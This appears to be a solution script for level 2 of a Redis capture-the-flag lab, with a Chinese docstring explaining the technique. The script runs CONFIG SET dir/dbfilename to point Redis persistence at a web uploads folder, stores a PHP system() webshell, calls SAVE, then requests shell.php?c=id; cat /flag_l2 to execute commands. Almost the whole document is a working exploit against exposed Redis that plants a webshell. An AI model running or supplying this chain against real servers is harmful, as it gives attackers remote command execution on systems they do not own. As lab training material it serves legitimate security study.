"""L2 · 用 SAVE 把 RDB 写成 webshell

原理一句话：Redis 的持久化就是「把内存里的数据写成一个文件」，
而文件路径和文件名都能用 CONFIG SET 现场改。于是：

    CONFIG SET dir /var/www/html/uploads     # 写到哪
    CONFIG SET dbfilename shell.php          # 叫什么
    SET payload "<?php system($_GET[c]); ?>" # 写什么
    SAVE                                     # 落盘

内存里的 payload 就变成了磁盘上的 shell.php。

两个必须知道的坑：
  1. RDB 不是纯文本，文件开头有 "REDIS0011" 之类的二进制头和大量元数据。
     PHP 只在遇到 <?php 之后才开始解析，所以前面的垃圾不影响执行。
     但**取 flag 时别用正则取第一个**，RDB 里可能混着别的 flag。
  2. Redis 7 把 dir / dbfilename 列为 protected config，默认禁止运行时
     CONFIG SET。真实环境打不动就是撞在这。靶场用
     enable-protected-configs yes 还原了老版本行为。

跑法：
    python3 02_webshell.py
"""

import sys
import urllib.parse
import urllib.request

from _util import WEB, connect, find_flag, run, show

PHP = '<?php system($_GET["c"]); ?>'


def main():
    s = connect()

    print("=== 第一步：改落盘位置 ===")
    # rdbcompression 关掉：redis 默认会对字符串做 LZF 压缩，
    # payload 一长就可能被压成二进制，写出来的 webshell 直接报废。
    show("CONFIG SET rdbcompression", run(s, "CONFIG", "SET", "rdbcompression", "no"))
    show("CONFIG SET dir", run(s, "CONFIG", "SET", "dir", "/var/www/html/uploads"))
    show("CONFIG SET dbfilename", run(s, "CONFIG", "SET", "dbfilename", "shell.php"))

    print("\n=== 第二步：把 payload 塞进内存 ===")
    show("SET payload", run(s, "SET", "payload", PHP))

    print("\n=== 第三步：SAVE 落盘 ===")
    show("SAVE", run(s, "SAVE"))

    # 确认一下文件真的写出来了（从 redis 容器内部看）
    print("\n（接着访问 web 端执行命令）")
    url = "%s/uploads/shell.php?c=%s" % (WEB, urllib.parse.quote("id; cat /flag_l2"))
    print("URL:", url)

    with urllib.request.urlopen(url, timeout=10) as r:
        body = r.read().decode("utf-8", "replace")

    print("\n=== 响应（RDB 二进制会糊掉前面一段，看最后几行）===")
    print(body[-500:])

    f = find_flag(body, last=True)
    if f:
        print("\n[+] L2 flag:", f)
        return 0
    print("\n[-] 没读到 flag，检查 uploads 目录是否可写、shell.php 是否落地",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
